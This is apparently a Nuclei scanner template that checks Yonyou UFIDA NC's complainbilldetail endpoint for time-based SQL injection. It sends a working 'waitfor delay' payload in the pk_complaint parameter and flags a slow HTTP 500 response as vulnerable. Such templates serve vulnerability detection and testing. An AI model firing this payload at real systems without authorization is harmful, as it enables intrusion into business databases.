id: yonyou-UFIDA-NC-complainbilldetail-sqli

info:
  name: YYNC-complainbilldetail-SQL
  author: HuanXiong
  severity: high
  reference: |
    -
  tags: SQL Injection

http:
  - raw:
      - |
        GET /ebvp/advorappcoll/complainbilldetail?pageId=login&pk_complaint=1'waitfor+delay+'0:0:5'-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: keep-alive
               
    matchers:     
      - type: dsl
        name: SQL注入
        dsl:
          - "status_code == 500 && duration>=5 && duration<=15 && contains(header,'text/html')" 